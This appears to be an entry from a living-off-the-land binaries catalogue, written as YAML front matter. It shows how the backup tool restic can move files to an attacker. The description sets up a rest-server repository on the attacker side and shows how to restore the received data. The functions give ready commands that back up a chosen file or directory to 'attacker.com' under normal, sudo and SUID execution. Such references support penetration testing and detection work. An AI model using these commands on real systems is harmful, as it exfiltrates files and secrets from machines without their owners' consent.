---
description: |
  The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:

  ```console
  RPORT=12345
  NAME=backup_name
  ./rest-server --listen ":$RPORT"
  restic init -r "rest:http://localhost:$RPORT/$NAME"
  ```

  To extract the data from the restic repository in the current directory on the attacker side:

  ```console
  restic restore -r "/tmp/restic/$NAME" latest --target .
  ```

  Upload data to the attacker server with the following commands.
functions:
  file-upload:
    - code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_or_dir_to_get
        NAME=backup_name
        restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
  sudo:
    - code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_or_dir_to_get
        NAME=backup_name
        sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
  suid:
    - code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_or_dir_to_get
        NAME=backup_name
        ./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
---
